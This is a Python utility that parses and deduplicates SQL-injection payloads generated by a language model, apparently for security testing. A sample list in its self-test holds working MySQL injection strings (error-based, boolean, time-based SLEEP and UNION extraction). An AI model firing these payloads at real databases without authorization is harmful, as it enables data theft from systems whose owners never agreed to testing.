import re
from typing import List, Dict


def parse(llm_output: str) -> List[Dict[str, str]]:
    """
    Parse LLM output in 'TYPE | PATTERN_FAMILY | PAYLOAD' format.

    Returns a list of dicts:
        [{"type": "ERROR_BASED", "family": "extractvalue_version", "payload": "0 OR EXTRACTVALUE(...)"}]
    """
    results = []

    for line in llm_output.strip().splitlines():
        line = line.strip()
        if not line:
            continue

        # Expected format: TYPE | PATTERN_FAMILY | PAYLOAD
        parts = line.split("|")
        if len(parts) < 3:
            continue

        vuln_type = parts[0].strip().upper()
        family    = parts[1].strip().lower()
        payload   = "|".join(parts[2:]).strip()  # payload itself may contain |

        # Skip obviously malformed lines
        if not vuln_type or not payload:
            continue
        if len(payload) < 3:
            continue

        results.append({
            "type":    vuln_type,
            "family":  family,
            "payload": payload,
        })

    return results


def deduplicate(records: List[Dict[str, str]]) -> List[Dict[str, str]]:
    """Case-insensitive deduplication by payload value (preserves order)."""
    seen = set()
    result = []
    for r in records:
        key = r["payload"].lower()
        if key not in seen:
            seen.add(key)
            result.append(r)
    return result


def clean(llm_output: str) -> List[Dict[str, str]]:
    """parse + deduplicate in one call."""
    return deduplicate(parse(llm_output))


def payloads_only(llm_output: str) -> List[str]:
    """Return only the payload strings (no type/family metadata)."""
    return [r["payload"] for r in clean(llm_output)]


# 파서 테스트 (직접 실행 시)
if __name__ == "__main__":
    mock_output = """
ERROR_BASED | extractvalue_version | 0 OR EXTRACTVALUE(1,CONCAT(0x7e,version()))
ERROR_BASED | updatexml_database | 0 OR UPDATEXML(1,CONCAT(0x7e,database()),1)
ERROR_BASED | floor_rand | 0 OR (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)
TAUTOLOGY | numeric_basic | 0 OR (1=1)
TAUTOLOGY | numeric_comment | 0 OR/**/1=1
CONDITIONAL | ascii_compare | 0 OR ASCII(SUBSTRING(database(),1,1))>64
BOOLEAN | length_check | 0 OR LENGTH(database())=6
TIME_BASED | simple_sleep | 0 OR SLEEP(5)
TIME_BASED | conditional_sleep | 0 OR IF(1=1,SLEEP(5),0)
UNION | null_probe | 0 UNION SELECT NULL,NULL,NULL-- -
UNION | version_extract | 0 UNION SELECT version(),NULL,NULL-- -
"""

    records = clean(mock_output)
    print(f"\nParsed {len(records)} payloads:\n")
    for r in records:
        print(f"  [{r['type']:20s}] [{r['family']:25s}] {r['payload']}")
